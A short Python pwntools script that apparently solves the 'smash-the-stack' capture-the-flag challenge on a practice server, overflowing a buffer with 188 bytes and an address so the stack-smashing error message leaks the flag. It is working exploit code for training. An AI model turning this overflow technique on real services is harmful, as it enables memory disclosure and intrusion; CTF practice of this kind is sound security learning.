from pwn import *

#io=process("./smash-the-stack")
io=remote('hackme.inndy.tw','7717')
payload='a'*188+p32(0x804a060)
io.recvuntil("flag\n")
io.sendline(payload)
io.recvuntil("stack smashing detected ***: ")
print(io.recvuntil("}\n"))
#io.interactive()
